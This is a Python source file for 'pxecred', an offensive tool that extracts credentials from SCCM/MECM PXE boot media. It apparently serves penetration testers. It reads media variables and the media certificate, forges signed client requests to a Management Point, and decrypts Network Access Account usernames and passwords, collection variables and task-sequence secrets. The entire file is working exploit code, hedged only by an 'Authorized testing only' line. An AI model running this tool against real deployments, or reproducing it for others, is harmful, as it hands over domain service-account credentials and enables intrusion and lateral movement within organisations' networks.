#!/usr/bin/env python3
"""pxecred — cross-platform SCCM/MECM PXE policy credential extractor.

Consumes a PXE media variables XML file and its media PFX, then retrieves
Network Access Account, Task Sequence, and Collection Variable policies from
a Configuration Manager Management Point and decrypts them without Windows
CryptoAPI or win32crypt.

Authorized testing only.
"""

import argparse
import binascii
import datetime
import hashlib
import os
import re
import sys
import zlib
from pathlib import Path

import requests
from requests_toolbelt import MultipartDecoder, MultipartEncoder
from lxml import etree as ET
from asn1crypto import cms
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.serialization import pkcs12
from Crypto.Cipher import DES3

__version__ = "1.0.0"


# ---------------------------------------------------------------------------
# Input / output helpers
# ---------------------------------------------------------------------------

def load_variables(path: Path):
    raw = path.read_bytes()
    text = None
    for enc in ("utf-16", "utf-8-sig", "utf-8"):
        try:
            text = raw.decode(enc)
            break
        except Exception:
            pass
    if text is None:
        raise SystemExit(f"Could not decode {path}")
    root = parse_xml(text)
    values = {}
    for var in root.iter("var"):
        name = var.attrib.get("name")
        if name:
            values[name] = var.text or ""
    return values


def parse_xml(text):
    if isinstance(text, bytes):
        return ET.fromstring(text)
    try:
        return ET.fromstring(text.encode("utf-16"))
    except Exception:
        cleaned = re.sub(r"^\s*<\?xml[^>]*\?>", "", text, count=1)
        return ET.fromstring(cleaned.encode("utf-8"))


def sanitize_filename(name):
    return re.sub(r"[^A-Za-z0-9_.-]+", "_", name)


def decode_text(data):
    if isinstance(data, str):
        return data
    for enc in ("utf-16", "utf-16-le", "utf-8-sig", "utf-8"):
        try:
            text = data.decode(enc)
            if "<" in text:
                return text
        except Exception:
            pass
    return data.decode("latin-1", errors="replace")


# ---------------------------------------------------------------------------
# SCCM credential deobfuscation
# ---------------------------------------------------------------------------

def aes_des_key_derivation(password: bytes) -> bytes:
    digest = hashlib.sha1(password).digest()
    b0 = bytes(x ^ 0x36 for x in digest) + b"\x36" * (64 - len(digest))
    b1 = bytes(x ^ 0x5C for x in digest) + b"\x5C" * (64 - len(digest))
    return hashlib.sha1(b0).digest() + hashlib.sha1(b1).digest()


def deobfuscate_credential_string(credential_string: str) -> str:
    value = re.sub(r"\s+", "", credential_string)
    key_data = binascii.unhexlify(value[8:88])
    encrypted_data = binascii.unhexlify(value[128:])
    key = aes_des_key_derivation(key_data)
    last_block = (len(encrypted_data) // 8) * 8
    cipher = DES3.new(key[:24], DES3.MODE_CBC, b"\x00" * 8)
    return cipher.decrypt(encrypted_data[:last_block]).decode("utf-16-le")


def trim_value(value: str) -> str:
    return value[: value.rfind("\x00")] if "\x00" in value else value


# ---------------------------------------------------------------------------
# Policy parsers
# ---------------------------------------------------------------------------

def process_naa_xml(naa_xml: str) -> None:
    print("[+] Extracting Network Access Account credentials")
    root = parse_xml(naa_xml)
    for settings in root.xpath("//*[@class='CCM_NetworkAccessAccount']"):
        try:
            username_node = settings.xpath(".//*[@name='NetworkAccessUsername']")[0].find("value")
            password_node = settings.xpath(".//*[@name='NetworkAccessPassword']")[0].find("value")
            username = trim_value(deobfuscate_credential_string(username_node.text))
            password = trim_value(deobfuscate_credential_string(password_node.text))
            print(f"[!] NAA Username: '{username}'")
            print(f"[!] NAA Password: '{password}'")
        except Exception as exc:
            print(f"[-] Could not parse NAA entry: {exc}")


def process_task_sequence_xml(ts_xml: str) -> None:
    root = parse_xml(ts_xml)
    pkg_name = root.xpath("//*[@name='PKG_Name']/value")[0].text or "TaskSequence"
    adv_id = root.xpath("//*[@name='ADV_AdvertisementID']/value")[0].text or "Unknown"
    sequence_tag = root.xpath("//*[@name='TS_Sequence']/value")[0].text or ""
    ts_name = sanitize_filename(f"{pkg_name}-{adv_id}").rstrip()

    Path(f"TaskSequence_policy_{ts_name}.xml").write_text(ts_xml, errors="replace")

    if sequence_tag[:9] == "<sequence":
        sequence = sequence_tag
    else:
        try:
            sequence = deobfuscate_credential_string(sequence_tag)
            print(f"[!] Decrypted TS_Sequence XML in '{pkg_name}'")
        except Exception as exc:
            print(f"[-] Could not decrypt TS_Sequence in '{pkg_name}': {exc}")
            return

    sequence = sequence[: sequence.rfind(">") + 1]
    sequence = "".join(c for c in sequence if c.isprintable())
    Path(f"TaskSequence_{ts_name}.xml").write_text(sequence, errors="replace")
    print(f"[+] Task Sequence: {pkg_name}")
    analyse_task_sequence_for_potential_creds(sequence)


def analyse_task_sequence_for_potential_creds(ts_xml: str) -> None:
    tree = parse_xml(ts_xml).getroottree()
    keywords = ["password", "account", "username"]
    parents = []
    found = False
    for word in keywords:
        expression = (
            '//*[contains(translate(@name,"ABCDEFGHIJKLMNOPQRSTUVWXYZ",'
            f'"abcdefghijklmnopqrstuvwxyz"),"{word}")]'
        )
        for element in tree.xpath(expression):
            if not found:
                print("[!] Possible credential fields found")
                found = True
            parent = element.getparent()
            if parent is None or parent in parents:
                continue
            parents.append(parent)
            step = parent.getparent()
            step_name = step.get("name") if step is not None else "unknown"
            print(f'In TS Step "{step_name}":')
            for other in [k for k in keywords if k != word]:
                other_expression = (
                    '//*[contains(translate(@name,"ABCDEFGHIJKLMNOPQRSTUVWXYZ",'
                    f'"abcdefghijklmnopqrstuvwxyz"),"{other}")]'
                )
                for candidate in parent.xpath(other_expression):
                    if candidate is not element:
                        print(f"  {candidate.get('name')} - {candidate.text}")
            print(f"  {element.get('name')} - {element.text}")
    if not found:
        print("[!] No credentials identified in this Task Sequence")


def process_collection_settings(text: str) -> None:
    print("[+] Collection Variables")
    try:
        root = parse_xml(text)
        compressed = zlib.decompress(binascii.unhexlify(root.text.strip())).decode("utf-16-le")
        root = parse_xml(compressed)
        instances = root.find("PolicyRule").find("PolicyAction").findall("instance")
        for instance in instances:
            name = instance.xpath(".//*[@name='Name']/value")[0].text
            value = instance.xpath(".//*[@name='Value']/value")[0].text
            print(f"[!] Collection Variable: '{name}'")
            print(f"[!] Value: '{trim_value(deobfuscate_credential_string(value))}'")
    except Exception as exc:
        print(f"[-] CollectionSettings parse failed: {exc}")


# ---------------------------------------------------------------------------
# PFX, signatures, and CMS
# ---------------------------------------------------------------------------

def load_pfx(path: Path, password: str):
    key, cert, extra = pkcs12.load_key_and_certificates(path.read_bytes(), password.encode())
    if key is None or cert is None:
        raise SystemExit("PFX does not contain a private key and certificate")
    return key, cert, extra


def sign_standard(data: bytes, key, hash_cls) -> bytes:
    return key.sign(data, padding.PKCS1v15(), hash_cls())


def sign_raw(data: bytes, key, hash_cls) -> bytes:
    if not isinstance(key, rsa.RSAPrivateKey):
        raise ValueError("raw signing requires an RSA key")
    digest = hashlib.new("sha256" if hash_cls is hashes.SHA256 else "sha1", data).digest()
    nums = key.private_numbers()
    modulus = nums.public_numbers.n
    size = (modulus.bit_length() + 7) // 8
    if len(digest) > size - 11:
        raise ValueError("hash too large for raw RSA signature")
    encoded = b"\x00\x01" + b"\xff" * (size - len(digest) - 3) + b"\x00" + digest
    signature = pow(int.from_bytes(encoded, "big"), nums.d, modulus)
    return signature.to_bytes(size, "big")


def signature_hex(data: bytes, key, hash_cls, mode: str) -> str:
    signature = sign_standard(data, key, hash_cls) if mode.startswith("std") else sign_raw(data, key, hash_cls)
    if mode.endswith("little"):
        signature = signature[::-1]
    return binascii.hexlify(signature).decode()


def make_signatures(media_guid, timestamp, key, hash_cls, mode):
    id_data = media_guid.encode("utf-16-le") + b"\x00\x00"
    ts_data = timestamp.encode("utf-16-le") + b"\x00\x00"
    token_data = (media_guid + ";" + timestamp + "\0").encode("utf-16-le")
    return (
        signature_hex(id_data, key, hash_cls, mode),
        signature_hex(ts_data, key, hash_cls, mode),
        signature_hex(token_data, key, hash_cls, mode),
    )


def mp_info(base_url: str):
    r = requests.get(base_url.rstrip("/") + "/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA", timeout=20)
    print(f"[+] MPKEYINFORMATIONMEDIA: HTTP {r.status_code}")
    if r.status_code != 200:
        print(r.text[:400])
        raise SystemExit("MPKEYINFORMATIONMEDIA failed")
    root = ET.fromstring(r.content)
    unknown = root.find("UnknownMachines")
    site = root.find("SITECODE")
    if unknown is None or site is None:
        raise SystemExit("Invalid MP response")
    client_id = unknown.get("x86UnknownMachineGUID") or unknown.get("x64UnknownMachineGUID")
    if not client_id:
        raise SystemExit("No unknown machine GUID")
    print(f"[+] Unknown machine GUID: {client_id}")
    print(f"[+] Site code: {site.text}")
    return client_id, site.text


def request_assignments(base_url, client_id, sitecode, media_guid, timestamp, sigs, timeout):
    id_sig, ts_sig, token_sig = sigs
    first = (
        b"\xff\xfe"
        + (
            "<Msg><ID/><SourceID>"
            + client_id
            + "</SourceID><ReplyTo>direct:OSD</ReplyTo><Body Type=\"ByteRange\" Offset=\"0\" Length=\"728\"/>"
            + "<Hooks><Hook2 Name=\"clientauth\"><Property Name=\"Token\"><![CDATA[ClientToken:"
            + media_guid
            + ";"
            + timestamp
            + "\r\nClientTokenSignature:"
            + token_sig
            + "\r\n]]></Property></Hook2></Hooks><Payload Type=\"inline\"/>"
            + "<TargetEndpoint>MP_PolicyManager</TargetEndpoint><ReplyMode>Sync</ReplyMode></Msg>"
        ).encode("utf-16-le")
    )
    second = (
        '<RequestAssignments SchemaVersion="1.00" RequestType="Always" Ack="False" ValidationRequested="CRC">'
        + f"<PolicySource>SMS:{sitecode}</PolicySource><ServerCookie/><Resource ResourceType=\"Machine\"/>"
        + f"<Identification><Machine><ClientID>{client_id}</ClientID><NetBIOSName></NetBIOSName>"
        + "<FQDN></FQDN><SID/></Machine></Identification></RequestAssignments>\r\n"
    ).encode("utf-16-le") + b"\x00\x00\x00"

    encoder = MultipartEncoder(
        fields={
            "Msg": (None, first, "text/plain; charset=UTF-16"),
            "RequestAssignments": second,
        }
    )
    headers = {
        "Content-Type": encoder.content_type.replace("form-data", "mixed"),
        "CCMClientID": media_guid,
        "CCMClientIDSignature": id_sig,
        "CCMClientTimestamp": timestamp,
        "CCMClientTimestampSignature": ts_sig,
    }
    session = requests.Session()
    session.trust_env = False
    r = session.request(
        "CCM_POST",
        base_url.rstrip("/") + "/ccm_system/request",
        data=encoder,
        headers=headers,
        timeout=timeout,
    )
    print(f"    policy request: HTTP {r.status_code} {r.headers.get('Content-Type','')}")
    if r.status_code != 200:
        print("    " + r.text[:300].replace("\n", " "))
        return None, None
    try:
        decoded = MultipartDecoder.from_response(r)
    except Exception as exc:
        print(f"    multipart decode failed: {exc}")
        return None, None
    if len(decoded.parts) < 2:
        print(f"    unexpected multipart parts: {len(decoded.parts)}")
        return None, None
    try:
        policy_xml = zlib.decompress(decoded.parts[1].content).decode("utf-16-le")
    except Exception as exc:
        print(f"    policy decompression failed: {exc}")
        return None, None
    return policy_xml, headers


def _unpad(data: bytes, block_size: int) -> bytes:
    if not data:
        return data
    pad = data[-1]
    if 1 <= pad <= block_size and data.endswith(bytes([pad]) * pad):
        return data[:-pad]
    return data


def _unwrap_bytes(data: bytes, key) -> bytes:
    if not data:
        return data
    if data[:2] in (b"\xff\xfe", b"<\x00") or data.lstrip()[:1] == b"<":
        return data
    if data[:1] != b"\x30":
        return data
    try:
        return _unwrap_ci(cms.ContentInfo.load(data), key)
    except Exception:
        return data


def _unwrap_ci(ci, key) -> bytes:
    content_type = ci["content_type"].native
    if content_type == "data":
        return ci["content"].native
    if content_type == "signed_data":
        content = ci["content"]["encap_content_info"]["content"]
        if content is None or content.native is None:
            return b""
        return _unwrap_bytes(content.native, key)
    if content_type != "enveloped_data":
        return ci["content"].native if ci["content"] is not None else b""

    env = ci["content"]
    eci = env["encrypted_content_info"]
    algorithm_info = eci["content_encryption_algorithm"]
    algorithm = algorithm_info["algorithm"].native
    iv = None
    params = algorithm_info["parameters"]
    if params is not None:
        native = params.native
        if isinstance(native, dict):
            iv = native.get("iv")
        elif isinstance(native, (bytes, bytearray)):
            iv = bytes(native)
    if iv is None:
        raise ValueError(f"no CMS IV for {algorithm}")

    cek = None
    for recipient in env["recipient_infos"]:
        if getattr(recipient, "name", None) != "ktri":
            continue
        ktri = recipient.chosen
        encrypted_key = ktri["encrypted_key"].native
        key_algorithm = ktri["key_encryption_algorithm"]["algorithm"].native
        try:
            if key_algorithm == "rsaes_oaep":
                cek = key.decrypt(
                    encrypted_key,
                    padding.OAEP(mgf=padding.MGF1(hashes.SHA1()), algorithm=hashes.SHA1(), label=None),
                )
            else:
                cek = key.decrypt(encrypted_key, padding.PKCS1v15())
            break
        except Exception:
            continue
    if cek is None:
        raise ValueError("could not decrypt CMS content key")

    ciphertext = eci["encrypted_content"].native
    if algorithm in ("aes128_cbc", "aes192_cbc", "aes256_cbc"):
        decryptor = Cipher(algorithms.AES(cek), modes.CBC(iv)).decryptor()
        plaintext = _unpad(decryptor.update(ciphertext) + decryptor.finalize(), 16)
    elif algorithm in ("tripledes_3key", "des_ede3_cbc"):
        plaintext = DES3.new(cek, DES3.MODE_CBC, iv).decrypt(ciphertext)
        plaintext = _unpad(plaintext, 8)
    else:
        raise ValueError(f"unsupported CMS cipher: {algorithm}")
    return _unwrap_bytes(plaintext, key)


def decrypt_content(data: bytes, key) -> bytes:
    if not data:
        return b""
    try:
        return _unwrap_ci(cms.ContentInfo.load(data), key)
    except Exception as exc:
        print(f"    CMS decrypt failed: {exc}")
        return data


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        prog="pxecred",
        description="Cross-platform SCCM/MECM PXE policy credential extractor",
    )
    parser.add_argument("--variables", default="variables.xml", help="PXE media variables XML")
    parser.add_argument("--pfx", help="Media PFX (default: extract from variables to media.pfx)")
    parser.add_argument("--pfx-password", help="PFX password (default: first 31 chars of _SMSMediaGuid)")
    parser.add_argument("--mp", help="Management Point base URL (default: SMSTSMP/SMSTSLocationMPs)")
    parser.add_argument("--output", default="pxecred-output", help="Output directory")
    parser.add_argument("--sig-mode", default="auto",
                        choices=["auto", "raw-little", "raw-big", "std-little", "std-big"])
    parser.add_argument("--hash", default="sha256", choices=["sha256", "sha1"])
    parser.add_argument("--timeout", type=int, default=30)
    parser.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
    args = parser.parse_args()

    variables_path = Path(args.variables).expanduser()
    if not variables_path.is_file():
        raise SystemExit(f"variables XML not found: {variables_path}")
    values = load_variables(variables_path)
    media_guid = values.get("_SMSMediaGuid", "").strip()
    if not media_guid:
        raise SystemExit("_SMSMediaGuid is missing from the media variables")

    output = Path(args.output).expanduser()
    output.mkdir(parents=True, exist_ok=True)

    if args.pfx:
        pfx_path = Path(args.pfx).expanduser()
    else:
        pfx_hex = values.get("_SMSTSMediaPFX", "")
        if not pfx_hex:
            raise SystemExit("No --pfx and no _SMSTSMediaPFX in variables XML")
        pfx_path = output / "media.pfx"
        pfx_path.write_bytes(binascii.unhexlify(pfx_hex))
        print(f"[+] Extracted PFX: {pfx_path}")

    password = args.pfx_password or media_guid[:31]
    key, cert, _ = load_pfx(pfx_path, password)
    print(f"[+] PFX: {pfx_path}")
    print(f"[+] Certificate subject: {cert.subject.rfc4514_string()}")

    base_url = args.mp or values.get("SMSTSMP") or values.get("SMSTSLocationMPs")
    if not base_url:
        raise SystemExit("No Management Point URL; pass --mp")
    base_url = base_url.strip().rstrip("/")
    print(f"[+] Management Point: {base_url}")

    client_id, sitecode = mp_info(base_url)
    hash_cls = hashes.SHA256 if args.hash == "sha256" else hashes.SHA1
    modes = ["raw-little", "std-little", "raw-big", "std-big"] if args.sig_mode == "auto" else [args.sig_mode]

    policy_xml = None
    policy_headers = None
    for mode in modes:
        timestamp = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0).strftime(
            "%Y-%m-%dT%H:%M:%SZ"
        )
        print(f"[+] Trying signature mode: {mode}/{args.hash}")
        sigs = make_signatures(media_guid, timestamp, key, hash_cls, mode)
        policy_xml, policy_headers = request_assignments(
            base_url, client_id, sitecode, media_guid, timestamp, sigs, args.timeout
        )
        if policy_xml:
            print(f"[+] Signature mode accepted: {mode}")
            break
    if not policy_xml:
        raise SystemExit("No policy assignments returned; all signature modes failed")

    (output / "policy_assignments.raw.xml").write_text(policy_xml, errors="replace")
    policy_xml = "".join(c for c in policy_xml if c.isprintable())
    end_tag = "</PolicyAssignments>"
    if end_tag in policy_xml:
        policy_xml = policy_xml[: policy_xml.rfind(end_tag) + len(end_tag)]
    (output / "policy_assignments.xml").write_text(policy_xml)

    root = parse_xml(policy_xml)
    policy_urls = {}
    for assignment in root.findall("PolicyAssignment"):
        for policy in assignment.findall("Policy"):
            category = policy.get("PolicyCategory")
            location = policy.find("PolicyLocation")
            if location is None or not location.text:
                continue
            url = location.text.strip().replace("http://<mp>", base_url)
            if category:
                policy_urls[category] = url
            else:
                policy_id = "".join(c for c in (policy.get("PolicyID") or "") if c not in "\\/:*?<>|")
                if policy_id:
                    policy_urls[policy_id] = url
    print(f"[+] {len(policy_urls)} policy URLs found")

    session = requests.Session()
    session.trust_env = False
    naa_configs = []
    ts_configs = []
    collection_configs = []
    for category, url in policy_urls.items():
        if not any(x in category for x in ("NAAConfig", "TaskSequence", "CollectionSettings")):
            continue
        print(f"[+] Requesting {category}")
        try:
            response = session.get(url, headers=policy_headers, timeout=args.timeout)
        except Exception as exc:
            print(f"    request failed: {exc}")
            continue
        if response.status_code != 200:
            print(f"    HTTP {response.status_code}")
            continue
        safe = sanitize_filename(category)
        (output / f"{safe}.raw").write_bytes(response.content)
        plain = decrypt_content(response.content, key)
        (output / f"{safe}.dec").write_bytes(plain if isinstance(plain, bytes) else plain.encode())
        text = decode_text(plain)
        if "<" in text:
            text = text[text.find("<"):]
        text = "".join(c for c in text if c.isprintable())
        (output / f"{safe}.xml").write_text(text, errors="replace")
        if "NAAConfig" in category:
            naa_configs.append(text)
        elif "TaskSequence" in category:
            ts_configs.append(text)
        elif "CollectionSettings" in category:
            collection_configs.append(text)

    old_cwd = os.getcwd()
    os.chdir(output)
    try:
        for text in collection_configs:
            process_collection_settings(text)
        for text in naa_configs:
            process_naa_xml(text)
        for text in ts_configs:
            process_task_sequence_xml(text)
    finally:
        os.chdir(old_cwd)

    print(f"\n[+] Done. Output: {output}")


if __name__ == "__main__":
    main()
